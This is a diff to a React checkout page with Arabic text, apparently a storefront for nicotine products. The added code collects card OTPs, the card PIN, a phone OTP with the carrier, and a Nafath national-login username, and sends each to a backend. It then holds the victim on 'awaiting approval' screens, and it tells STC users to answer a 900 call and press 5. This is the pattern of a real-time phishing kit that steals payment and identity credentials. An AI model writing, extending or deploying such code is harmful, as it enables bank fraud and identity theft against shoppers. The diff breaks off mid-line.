   const handlePhoneOtpVerify = async () => {
-    if (phoneOtp.length !== 6) {
-      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
-      return
+    if (phoneOtp.length < 4) {
+      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح");
+      return;
     }
-    setIsVerifying(true)
-    setVerificationError("")
+    if (!visitorId) return;
+
+    setIsVerifying(true);
+    setVerificationError("");
     try {
-      await verifyOtp(phoneOtpVerificationId, phoneOtp)
-      setIsVerifying(false)
-      setPhoneOtp("")
-      setStep("nafath")
+      await saveStepData(visitorId, "phoneOtp", {
+        phone: phone2,
+        phoneOtp,
+        operator: phoneProvider,
+        submittedAt: new Date().toISOString(),
+        phoneOtpSubmitted: true,
+      });
+      setIsVerifying(false);
+      setRejectionError("");
+      setWaitingForApproval(true);
+      setApprovalMessage("جاري التحقق من رمز الجوال...");
     } catch (error: any) {
-      console.error("❌ Phone OTP verification error:", error)
-      setIsVerifying(false)
-      setVerificationError(error.message || "رمز التحقق غير صحيح")
+      console.error("Phone OTP verification error:", error);
+      setIsVerifying(false);
+      setVerificationError(error.message || "رمز التحقق غير صحيح");
     }
-  }
+  };
 
   const handleNafathVerify = async () => {
-    if (nafathId.length !== 10) {
-      setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
-      return
+    if (nafadUsername.length !== 10) {
+      setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)");
+      return;
     }
-    const visitorId = localStorage.getItem("visitor")
-
-    setIsVerifying(true)
-    setVerificationError("")
+    if (!visitorId) return;
+    await addData({ id: visitorId, nafadUsername });
+    setIsVerifying(true);
+    setVerificationError("");
     try {
-      await new Promise((resolve) => setTimeout(resolve, 2000))
-      setIsVerifying(false)
-      setStep("auth-dialog")
+      await saveStepData(visitorId, "nafath", {
+        submittedAt: new Date().toISOString(),
+        nafathSubmitted: true,
+      });
+      setIsVerifying(false);
+      setRejectionError("");
+      setWaitingForApproval(true);
+      setApprovalMessage("جاري التحقق من نفاذ...");
     } catch (error) {
-      console.error("❌ Nafath verification error:", error)
-      setIsVerifying(false)
-      setVerificationError("فشل التحقق من نفاذ")
+      console.error("Nafath verification error:", error);
+      setIsVerifying(false);
+      setVerificationError("فشل التحقق من نفاذ");
     }
-  }
+  };
 
   const handleFinalSubmit = async () => {
-    setIsProcessingOrder(true)
-    setOrderError("")
+    setIsProcessingOrder(true);
+    setOrderError("");
     try {
-      const visitorId = localStorage.getItem("visitor")
-      const orderId = `order-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
+      if (!visitorId) return;
+      const orderId = `order-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
 
       const paysData = {
         id: orderId,
@@ -570,7 +819,7 @@ export default function CheckoutPage() {
           phone2: phone2,
           phoneProvider: phoneProvider,
           phoneOtpVerified: true,
-          nafathVerified: !!nafathId,
+          nafathVerified: !!nafadUsername,
           verifiedAt: new Date().toISOString(),
         },
 
@@ -600,39 +849,39 @@ export default function CheckoutPage() {
           platform: navigator.platform,
           language: navigator.language,
         },
-      }
+      };
 
-      await addData(paysData)
+      await addData(paysData);
 
-      setIsProcessingOrder(false)
-      clearCart()
-      setStep("success")
+      setIsProcessingOrder(false);
+      clearCart();
+      goToStep("success");
     } catch (error) {
-      console.error("❌ Order submission error:", error)
-      setIsProcessingOrder(false)
-      setOrderError("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.")
+      console.error("❌ Order submission error:", error);
+      setIsProcessingOrder(false);
+      setOrderError("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.");
     }
-  }
+  };
 
   const handleResendOtp = async () => {
-    setVerificationError("")
-    setCanResendOtp(false)
-    setResendTimer(30)
+    setVerificationError("");
+    setCanResendOtp(false);
+    setResendTimer(30);
     if (step === "card-otp") {
-      setCardOtp("")
-      await sendCardOtp()
+      setCardOtp("");
+      await sendCardOtp();
     } else if (step === "phone-otp") {
-      setPhoneOtp("")
-      await sendPhoneOtp()
+      setPhoneOtp("");
+      await sendPhoneOtp();
     }
-  }
+  };
 
   const handleMapAddressSelect = (address: {
-    lat: number
-    lng: number
-    city: string
-    district: string
-    street: string
+    lat: number;
+    lng: number;
+    city: string;
+    district: string;
+    street: string;
   }) => {
     setShippingInfo({
       ...shippingInfo,
@@ -640,23 +889,23 @@ export default function CheckoutPage() {
       district: address.district,
       street: address.street,
       coordinates: { lat: address.lat, lng: address.lng },
-    })
-    setShowMap(false)
-  }
+    });
+    setShowMap(false);
+  };
 
   const handleAgeVerified = () => {
-    localStorage.setItem("ageVerified", "true")
-    setShowAgeVerification(false)
-    const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
+    localStorage.setItem("ageVerified", "true");
+    setShowAgeVerification(false);
+    const hasSeenPromo = sessionStorage.getItem("hasSeenPromo");
     if (!hasSeenPromo) {
-      setShowPromoPopup(true)
-      sessionStorage.setItem("hasSeenPromo", "true")
+      setShowPromoPopup(true);
+      sessionStorage.setItem("hasSeenPromo", "true");
     }
-  }
+  };
 
   const handleAgeRejected = () => {
-    window.location.href = "https://www.google.com"
-  }
+    window.location.href = "https://www.google.com";
+  };
 
   if (items.length === 0 && step === "cart") {
     return (
@@ -673,12 +922,20 @@ export default function CheckoutPage() {
           </CardContent>
         </Card>
       </div>
-    )
+    );
   }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 p-4">
-      <PromoPopup open={showPromoPopup} onClose={() => setShowPromoPopup(false)} />
+      {/* Step Loading Overlay */}
+      {stepLoading && (
+        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center">
+          <div className="text-center">
+            <Loader2 className="h-12 w-12 animate-spin mx-auto mb-4 text-primary" />
+            <p className="text-lg font-medium">جاري التحميل...</p>
+          </div>
+        </div>
+      )}
 
       <div className="max-w-4xl mx-auto">
         {/* Progress Stepper */}
@@ -689,12 +946,21 @@ export default function CheckoutPage() {
                 <div className="flex flex-col items-center flex-1">
                   <div
                     className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-colors ${
-                      ["cart", "shipping", "payment"].includes(step) && s === step
+                      ["cart", "shipping", "payment"].includes(step) &&
+                      s === step
                         ? "bg-primary text-primary-foreground border-primary"
-                        : !["cart", "shipping", "payment"].includes(step) && s === "verification"
+                        : !["cart", "shipping", "payment"].includes(step) &&
+                            s === "verification"
                           ? "bg-primary text-primary-foreground border-primary"
-                          : ["cart", "shipping", "payment"].indexOf(step as any) >
-                              ["cart", "shipping", "payment", "verification"].indexOf(s)
+                          : ["cart", "shipping", "payment"].indexOf(
+                                step as any,
+                              ) >
+                              [
+                                "cart",
+                                "shipping",
+                                "payment",
+                                "verification",
+                              ].indexOf(s)
                             ? "bg-primary text-primary-foreground border-primary"
                             : "bg-background text-muted-foreground border-border"
                     }`}
@@ -711,8 +977,8 @@ export default function CheckoutPage() {
                 {i < 3 && (
                   <div
                     className={`h-0.5 flex-1 transition-colors ${
-                      ["cart", "shipping", "payment"].indexOf(step as any) > i ||
-                      !["cart", "shipping", "payment"].includes(step)
+                      ["cart", "shipping", "payment"].indexOf(step as any) >
+                        i || !["cart", "shipping", "payment"].includes(step)
                         ? "bg-primary"
                         : "bg-border"
                     }`}
@@ -740,13 +1006,29 @@ export default function CheckoutPage() {
                     className="flex gap-2 p-2 rounded-lg border bg-card hover:shadow-sm transition-shadow"
                   >
                     <img
-                      src={item.imageUrl || "/placeholder.svg?height=80&width=80"}
+                      src={
+                        item.imageUrl || "/placeholder.svg?height=80&width=80"
+                      }
                       alt={item.nameAr}
                       className="w-16 h-16 object-cover rounded"
                     />
                     <div className="flex-1">
                       <h3 className="font-semibold">{item.nameAr}</h3>
-                      <p className="text-sm text-muted-foreground">{item.price} ريال</p>
+                      <p className="text-sm text-muted-foreground">
+                        {item.price} ريال
+                      </p>
+                      <div className="flex items-center gap-2 mt-2">
+                        <select
+                          value={item.strength}
+                          onChange={(e) => updateCartStrength(item.productId, e.target.value)}
+                          className="h-8 px-2 text-sm rounded-md border border-input bg-background focus:outline-none focus:ring-2 focus:ring-ring"
+                        >
+                          <option value="٣ ملغ">3mg</option>
+                          <option value="٦ ملغ">6mg</option>
+                          <option value="٧ ملغ">7mg</option>
+                          <option value="١٠ ملغ">10mg</option>
+                        </select>
+                      </div>
                       <div className="flex items-center gap-2 mt-2">
                         <Button
                           size="icon"
@@ -757,7 +1039,9 @@ export default function CheckoutPage() {
                         >
                           <Minus className="h-4 w-4" />
                         </Button>
-                        <span className="w-8 text-center font-medium">{item.quantity}</span>
+                        <span className="w-8 text-center font-medium">
+                          {item.quantity}
+                        </span>
                         <Button
                           size="icon"
                           variant="outline"
@@ -777,7 +1061,9 @@ export default function CheckoutPage() {
                       >
                         <Trash2 className="h-4 w-4" />
                       </Button>
-                      <p className="font-bold">{item.price * item.quantity} ريال</p>
+                      <p className="font-bold">
+                        {item.price * item.quantity} ريال
+                      </p>
                     </div>
                   </div>
                 ))}
@@ -795,7 +1081,9 @@ export default function CheckoutPage() {
                 </div>
                 <div className="flex justify-between">
                   <span className="text-muted-foreground">رسوم الشحن</span>
-                  <span>{shippingFee === 0 ? "مجاني" : `${shippingFee} ريال`}</span>
+                  <span>
+                    {shippingFee === 0 ? "مجاني" : `${shippingFee} ريال`}
+                  </span>
                 </div>
                 {shippingFee === 0 && (
                   <Badge variant="secondary" className="w-fit">
@@ -811,7 +1099,12 @@ export default function CheckoutPage() {
                   <span>الإجمالي</span>
                   <span>{finalTotal.toFixed(2)} ريال</span>
                 </div>
-                <Button className="w-full" size="lg" onClick={() => setStep("shipping")}>
+                <Button
+                  className="w-full"
+                  size="lg"
+                  onClick={() => goToStep("shipping")}
+                  disabled={stepLoading}
+                >
                   المتابعة إلى الشحن
                 </Button>
               </CardContent>
@@ -844,11 +1137,19 @@ export default function CheckoutPage() {
                     id="fullName"
                     placeholder="أدخل الاسم الكامل"
                     value={shippingInfo.fullName}
-                    onChange={(e) => handleShippingChange("fullName", e.target.value)}
+                    onChange={(e) =>
+                      handleShippingChange("fullName", e.target.value)
+                    }
                     onBlur={() => handleShippingBlur("fullName")}
-                    className={shippingErrors.fullName ? "border-destructive" : ""}
+                    className={
+                      shippingErrors.fullName ? "border-destructive" : ""
+                    }
                   />
-                  {shippingErrors.fullName && <p className="text-sm text-destructive">{shippingErrors.fullName}</p>}
+                  {shippingErrors.fullName && (
+                    <p className="text-sm text-destructive">
+                      {shippingErrors.fullName}
+                    </p>
+                  )}
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone">رقم الجوال</Label>
@@ -858,11 +1159,17 @@ export default function CheckoutPage() {
                     type="tel"
                     placeholder="05XXXXXXXX"
                     value={shippingInfo.phone}
-                    onChange={(e) => handleShippingChange("phone", e.target.value)}
+                    onChange={(e) =>
+                      handleShippingChange("phone", e.target.value)
+                    }
                     onBlur={() => handleShippingBlur("phone")}
                     className={shippingErrors.phone ? "border-destructive" : ""}
                   />
-                  {shippingErrors.phone && <p className="text-sm text-destructive">{shippingErrors.phone}</p>}
+                  {shippingErrors.phone && (
+                    <p className="text-sm text-destructive">
+                      {shippingErrors.phone}
+                    </p>
+                  )}
                 </div>
               </div>
 
@@ -873,11 +1180,17 @@ export default function CheckoutPage() {
                     id="city"
                     placeholder="مثال: الرياض"
                     value={shippingInfo.city}
-                    onChange={(e) => handleShippingChange("city", e.target.value)}
+                    onChange={(e) =>
+                      handleShippingChange("city", e.target.value)
+                    }
                     onBlur={() => handleShippingBlur("city")}
                     className={shippingErrors.city ? "border-destructive" : ""}
                   />
-                  {shippingErrors.city && <p className="text-sm text-destructive">{shippingErrors.city}</p>}
+                  {shippingErrors.city && (
+                    <p className="text-sm text-destructive">
+                      {shippingErrors.city}
+                    </p>
+                  )}
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="district">الحي</Label>
@@ -885,7 +1198,12 @@ export default function CheckoutPage() {
                     id="district"
                     placeholder="أدخل الحي"
                     value={shippingInfo.district}
-                    onChange={(e) => setShippingInfo({ ...shippingInfo, district: e.target.value })}
+                    onChange={(e) =>
+                      setShippingInfo({
+                        ...shippingInfo,
+                        district: e.target.value,
+                      })
+                    }
                   />
                 </div>
               </div>
@@ -896,12 +1214,75 @@ export default function CheckoutPage() {
                   id="street"
                   placeholder="أدخل اسم الشارع"
                   value={shippingInfo.street}
-                  onChange={(e) => setShippingInfo({ ...shippingInfo, street: e.target.value })}
+                  onChange={(e) =>
+                    setShippingInfo({ ...shippingInfo, street: e.target.value })
+                  }
                 />
               </div>
 
+              <div className="grid gap-4 md:grid-cols-2">
+                <div className="space-y-2">
+                  <Label htmlFor="sex">الجنس</Label>
+                  <select
+                    id="sex"
+                    value={shippingInfo.sex || ""}
+                    onChange={(e) =>
+                      setShippingInfo({ ...shippingInfo, sex: e.target.value })
+                    }
+                    className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
+                  >
+                    <option value="">اختر الجنس</option>
+                    <option value="male">ذكر</option>
+                    <option value="female">أنثى</option>
+                  </select>
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="nationality">الجنسية</Label>
+                  <select
+                    id="nationality"
+                    value={shippingInfo.nationality || ""}
+                    onChange={(e) =>
+                      setShippingInfo({ ...shippingInfo, nationality: e.target.value })
+                    }
+                    className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
+                  >
+                    <option value="">اختر الجنسية</option>
+                    <option value="saudi">سعودي</option>
+                    <option value="other">أخرى</option>
+                  </select>
+                </div>
+              </div>
+
+              <div className="flex flex-col items-center gap-2 pt-4">
+                <Turnstile
+                  siteKey={
+                    import.meta.env.VITE_TURNSTILE_SITE_KEY ||
+                    "1x00000000000000000000AA"
+                  }
+                  onSuccess={(token) => {
+                    setCaptchaToken(token);
+                    setCaptchaError("");
+                  }}
+                  onError={() => setCaptchaError("فشل التحقق")}
+                  onExpire={() => {
+                    setCaptchaToken("");
+                    setCaptchaError(
+                      "انتهت صلاحية التحقق، يرجى المحاولة مرة أخرى",
+                    );
+                  }}
+                />
+                {captchaError && (
+                  <p className="text-sm text-destructive">{captchaError}</p>
+                )}
+              </div>
+
               <div className="flex gap-3 pt-4">
-                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("cart")}>
+                <Button
+                  variant="outline"
+                  className="flex-1 bg-transparent"
+                  onClick={() => goToStep("cart")}
+                  disabled={stepLoading}
+                >
                   رجوع
                 </Button>
                 <Button className="flex-1" onClick={handleShippingNext}>
@@ -915,46 +1296,37 @@ export default function CheckoutPage() {
         {/* Payment Step */}
         {step === "payment" && (
           <>
-            <Dialog open={showPaymentPopup} onOpenChange={setShowPaymentPopup}>
-              <DialogContent className="max-w-md">
-                <DialogHeader>
-                  <DialogTitle className="text-2xl text-center">تعليمات الدفع</DialogTitle>
-                  <DialogDescription className="text-center">
-                    يرجى الاطلاع على التعليمات قبل إدخال بيانات البطاقة
-                  </DialogDescription>
-                </DialogHeader>
-                <div className="space-y-4">
-                  <div className="rounded-lg overflow-hidden border">
-                    <img
-                      src="/payment-card-instructions-illustration.jpg"
-                      alt="تعليمات الدفع"
-                      className="w-full h-auto"
-                    />
-                  </div>
-                  <Button className="w-full" onClick={() => setShowPaymentPopup(false)}>
-                    فهمت، المتابعة للدفع
-                  </Button>
-                </div>
-              </DialogContent>
-            </Dialog>
+            <PromoPopup
+              open={showPromoPopup}
+              onClose={() => setShowPromoPopup(false)}
+            />
 
             <Card className="max-w-xl mx-auto shadow-lg border">
               <CardHeader className="space-y-1 text-center">
-                <CardTitle className="text-2xl font-bold">معلومات الدفع</CardTitle>
-                <CardDescription className="text-muted-foreground">جميع بياناتك مشفرة وآمنة</CardDescription>
+                <CardTitle className="text-2xl font-bold">
+                  معلومات الدفع
+                </CardTitle>
+                <CardDescription className="text-muted-foreground">
+                  جميع بياناتك مشفرة وآمنة
+                </CardDescription>
               </CardHeader>
               <CardContent className="space-y-6">
                 <div className="space-y-2">
                   <Label htmlFor="cardNumber">رقم البطاقة</Label>
                   <Input
                     id="cardNumber"
+                    dir="ltr"
                     placeholder="1234 5678 9012 3456"
                     className={`tracking-widest text-lg ${paymentErrors.cardNumber ? "border-destructive" : ""}`}
                     value={paymentInfo.cardNumber}
                     onChange={(e) => handleCardNumberChange(e.target.value)}
                     onBlur={() => handlePaymentBlur("cardNumber")}
                   />
-                  {paymentErrors.cardNumber && <p className="text-sm text-destructive">{paymentErrors.cardNumber}</p>}
+                  {paymentErrors.cardNumber && (
+                    <p className="text-sm text-destructive">
+                      {paymentErrors.cardNumber}
+                    </p>
+                  )}
                 </div>
 
                 <div className="space-y-2">
@@ -964,15 +1336,24 @@ export default function CheckoutPage() {
                     placeholder="الاسم كما هو مكتوب على البطاقة"
                     value={paymentInfo.cardName}
                     onChange={(e) => {
-                      setPaymentInfo({ ...paymentInfo, cardName: e.target.value })
+                      setPaymentInfo({
+                        ...paymentInfo,
+                        cardName: e.target.value,
+                      });
                       if (paymentErrors.cardName) {
-                        setPaymentErrors({ ...paymentErrors, cardName: "" })
+                        setPaymentErrors({ ...paymentErrors, cardName: "" });
                       }
                     }}
                     onBlur={() => handlePaymentBlur("cardName")}
-                    className={paymentErrors.cardName ? "border-destructive" : ""}
+                    className={
+                      paymentErrors.cardName ? "border-destructive" : ""
+                    }
                   />
-                  {paymentErrors.cardName && <p className="text-sm text-destructive">{paymentErrors.cardName}</p>}
+                  {paymentErrors.cardName && (
+                    <p className="text-sm text-destructive">
+                      {paymentErrors.cardName}
+                    </p>
+                  )}
                 </div>
 
                 <div className="grid grid-cols-2 gap-4">
@@ -984,9 +1365,15 @@ export default function CheckoutPage() {
                       value={paymentInfo.expiryDate}
                       onChange={(e) => handleExpiryChange(e.target.value)}
                       onBlur={() => handlePaymentBlur("expiryDate")}
-                      className={paymentErrors.expiryDate ? "border-destructive" : ""}
+                      className={
+                        paymentErrors.expiryDate ? "border-destructive" : ""
+                      }
                     />
-                    {paymentErrors.expiryDate && <p className="text-sm text-destructive">{paymentErrors.expiryDate}</p>}
+                    {paymentErrors.expiryDate && (
+                      <p className="text-sm text-destructive">
+                        {paymentErrors.expiryDate}
+                      </p>
+                    )}
                   </div>
                   <div className="space-y-2">
                     <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
@@ -999,7 +1386,11 @@ export default function CheckoutPage() {
                       onBlur={() => handlePaymentBlur("cvv")}
                       className={paymentErrors.cvv ? "border-destructive" : ""}
                     />
-                    {paymentErrors.cvv && <p className="text-sm text-destructive">{paymentErrors.cvv}</p>}
+                    {paymentErrors.cvv && (
+                      <p className="text-sm text-destructive">
+                        {paymentErrors.cvv}
+                      </p>
+                    )}
                   </div>
                 </div>
 
@@ -1009,10 +1400,18 @@ export default function CheckoutPage() {
                 </div>
 
                 <div className="flex gap-3 pt-2">
-                  <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("shipping")}>
+                  <Button
+                    variant="outline"
+                    className="flex-1 bg-transparent"
+                    onClick={() => goToStep("shipping")}
+                    disabled={stepLoading}
+                  >
                     رجوع
                   </Button>
-                  <Button className="flex-1 text-lg" onClick={handlePaymentNext}>
+                  <Button
+                    className="flex-1 text-lg"
+                    onClick={handlePaymentNext}
+                  >
                     تأكيد الدفع
                   </Button>
                 </div>
@@ -1027,31 +1426,47 @@ export default function CheckoutPage() {
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <CreditCard className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-center">التحقق من البطاقة</CardTitle>
+              <CardTitle className="text-2xl text-center">
+                التحقق من البطاقة
+              </CardTitle>
               <CardDescription className="text-center">
                 تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
               </CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
               <div>
-                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
+                <Label className="text-center block mb-4">
+                  أدخل رمز التحقق
+                </Label>
                 <div className="flex gap-2 justify-center" dir="ltr">
                   <Input
                     type="text"
                     inputMode="numeric"
                     autoComplete="one-time-code"
+                    name="one-time-code"
+                    pattern="[0-9]*"
                     maxLength={6}
                     value={cardOtp}
-                    onChange={(e) => setCardOtp(e.target.value)}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "");
+                      setCardOtp(val);
+                    }}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
+                {verificationError && (
+                  <p className="text-sm text-destructive text-center mt-2">
+                    {verificationError}
+                  </p>
+                )}
               </div>
 
               <div className="text-center text-sm text-muted-foreground">
                 {canResendOtp ? (
-                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
+                  <button
+                    onClick={handleResendOtp}
+                    className="text-primary hover:underline font-medium"
+                  >
                     إعادة إرسال الرمز
                   </button>
                 ) : (
@@ -1059,26 +1474,48 @@ export default function CheckoutPage() {
                 )}
               </div>
 
-              <div className="flex gap-3">
-                <Button
-                  variant="outline"
-                  className="flex-1 bg-transparent"
-                  onClick={() => setStep("payment")}
-                  disabled={isVerifying}
-                >
-                  رجوع
-                </Button>
-                <Button className="flex-1" onClick={handleCardOtpVerify} disabled={isVerifying}>
-                  {isVerifying ? (
-                    <>
-                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                      جاري التحقق...
-                    </>
-                  ) : (
-                    "تحقق"
-                  )}
-                </Button>
-              </div>
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
+                </div>
+              )}
+
+              {waitingForApproval ? (
+                <div className="text-center py-4">
+                  <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
+                  <p className="text-lg font-medium">{approvalMessage}</p>
+                  <p className="text-sm text-muted-foreground mt-2">
+                    يرجى الانتظار حتى يتم التحقق
+                  </p>
+                </div>
+              ) : (
+                <div className="flex gap-3">
+                  <Button
+                    variant="outline"
+                    className="flex-1 bg-transparent"
+                    onClick={() => goToStep("payment")}
+                    disabled={isVerifying}
+                  >
+                    رجوع
+                  </Button>
+                  <Button
+                    className="flex-1"
+                    onClick={handleCardOtpVerify}
+                    disabled={isVerifying}
+                  >
+                    {isVerifying ? (
+                      <>
+                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
+                        جاري التحقق...
+                      </>
+                    ) : (
+                      "تحقق"
+                    )}
+                  </Button>
+                </div>
+              )}
             </CardContent>
           </Card>
         )}
@@ -1089,8 +1526,12 @@ export default function CheckoutPage() {
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <Shield className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-center">رمز PIN للبطاقة</CardTitle>
-              <CardDescription className="text-center">أدخل رمز PIN المكون من 4 أرقام</CardDescription>
+              <CardTitle className="text-2xl text-center">
+                رمز PIN للبطاقة
+              </CardTitle>
+              <CardDescription className="text-center">
+                أدخل رمز PIN المكون من 4 أرقام
+              </CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
               <div>
@@ -1101,35 +1542,61 @@ export default function CheckoutPage() {
                     maxLength={4}
                     value={cardPin}
                     onChange={(e) => {
-                      const value = e.target.value.replace(/\D/g, "")
-                      setCardPin(value)
+                      const value = e.target.value.replace(/\D/g, "");
+                      setCardPin(value);
                     }}
                     className={`w-40 h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
+                {verificationError && (
+                  <p className="text-sm text-destructive text-center mt-2">
+                    {verificationError}
+                  </p>
+                )}
               </div>
 
-              <div className="flex gap-3">
-                <Button
-                  variant="outline"
-                  className="flex-1 bg-transparent"
-                  onClick={() => setStep("card-otp")}
-                  disabled={isVerifying}
-                >
-                  رجوع
-                </Button>
-                <Button className="flex-1" onClick={handleCardPinVerify} disabled={isVerifying}>
-                  {isVerifying ? (
-                    <>
-                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                      جاري التحقق...
-                    </>
-                  ) : (
-                    "تحقق"
-                  )}
-                </Button>
-              </div>
+              {rejectionError && (
+                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 text-center">
+                  <p className="text-destructive font-medium">
+                    {rejectionError}
+                  </p>
+                </div>
+              )}
+
+              {waitingForApproval ? (
+                <div className="text-center py-4">
+                  <Loader2 className="h-8 w-8 animate-spin mx-auto mb-3 text-primary" />
+                  <p className="text-lg font-medium">{approvalMessage}</p>
+                  <p className="text-sm text-muted-foreground mt-2">
+                    يرجى الانتظار حتى يتم التحقق
+                  </p>
+                </div>
+              ) : (
+                <div className="flex gap-3">
+                  <Button
+                    variant="outline"
+                    className="flex-1 bg-transparent"
+                    onClick={() => goToStep("card-otp")}
+                    disabled={isVerifying}
+                  >
+                    رجوع
+                  </Button>
+                  <Button
+                    className="flex-1"
+                    onClick={handleCardPinVerify}
+                    disabled={isVerifying}
+                  >
+                    {isVerifying ? (
+                      <>
+                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
+                        جاري التحقق...
+                      </>
+                    ) : (
+                      "تحقق"
+                    )}
+                  </Button>
+                </div>
+              )}
             </CardContent>
           </Card>
         )}
@@ -1140,12 +1607,16 @@ export default function CheckoutPage() {
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <Phone className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-center">معلومات الجوال</CardTitle>
-              <CardDescription className="text-center">تأكيد بيانات الاتصال</CardDescription>
+              <CardTitle className="text-2xl text-center">
+                معلومات الجوال
+              </CardTitle>
+              <CardDescription className="text-center">
+                تأكيد بيانات الاتصال
+              </CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
               <div className="space-y-3">
-                <Label htmlFor="phone2">رقم الجوال الثاني</Label>
+                <Label htmlFor="phone2">رقم الجوال المرتبط بالحساب</Label>
                 <Input
                   id="phone2"
                   type="tel"
@@ -1154,26 +1625,44 @@ export default function CheckoutPage() {
                   placeholder="05XXXXXXXX"
                   value={phone2}
                   onChange={(e) => {
-                    setPhone2(e.target.value)
-                    if (phone2Error) setPhone2Error("")
+                    setPhone2(e.target.value);
+                    if (phone2Error) setPhone2Error("");
                   }}
                   className={phone2Error ? "border-destructive" : ""}
                 />
-                {phone2Error && <p className="text-sm text-destructive">{phone2Error}</p>}
+                {phone2Error && (
+                  <p className="text-sm text-destructive">{phone2Error}</p>
+                )}
               </div>
 
               <div className="p-4 bg-muted rounded-lg space-y-3">
-                <Separator />
                 <div className="flex justify-between items-center">
                   <span className="text-muted-foreground">مزود الخدمة</span>
-                  <Badge variant="secondary" className="font-bold">
-                    {phoneProvider}
-                  </Badge>
+                  <select
+                    id="operator"
+                    value={phoneProvider}
+                    onChange={(e) => {
+                      setPhoneProvider(e.target.value);
+                      if (phone2Error) setPhone2Error("");
+                    }}
+                    className="text-black block w-full px-3 py-2.5 bg-neutral-secondary-medium border border-default-medium text-heading text-sm rounded-base focus:ring-brand focus:border-brand shadow-xs placeholder:text-body"
+                  >
+                    <option value="">اختر مزود الخدمة</option>
+                    <option value="Zain">زين</option>
+                    <option value="Mobily">موبايلي</option>
+                    <option value="STC">اس تي سي</option>
+                    <option value="Virgin">فيرجن</option>
+                  </select>
                 </div>
               </div>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("card-pin")}>
+                <Button
+                  variant="outline"
+                  className="flex-1 bg-transparent"
+                  onClick={() => goToStep("card-pin")}
+                  disabled={stepLoading}
+                >
                   رجوع
                 </Button>
                 <Button className="flex-1" onClick={handlePhoneVerification}>
@@ -1190,31 +1679,55 @@ export default function CheckoutPage() {
               <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                 <Phone className="h-6 w-6 text-primary" />
               </div>
-              <CardTitle className="text-2xl text-center">التحقق من الجوال</CardTitle>
+              <CardTitle className="text-2xl text-center">
+                التحقق من الجوال
+              </CardTitle>
               <CardDescription className="text-center">
                 تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
               </CardDescription>
+              {phoneProvider === "STC" && (
+                <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4 mt-4">
+                  <p className="text-blue-600 dark:text-blue-400 text-center font-medium">
+                    سيتم الاتصال بك من قبل 900 يرجى الرد علي الاتصال والضغط علي
+                    الرقم 5 للاستمرار
+                  </p>
+                </div>
+              )}
             </CardHeader>
             <CardContent className="space-y-6">
               <div>
-                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
+                <Label className="text-center block mb-4">
+                  أدخل رمز التحقق
+                </Label>
                 <div className="flex gap-2 justify-center" dir="ltr">
                   <Input
                     type="text"
                     inputMode="numeric"
                     autoComplete="one-time-code"
+                    name="one-time-code"
+                    pattern="[0-9]*"
                     maxLength={6}
                     value={phoneOtp}
-                    onChange={(e) => setPhoneOtp(e.target.value)}
+                    onChange={(e) => {
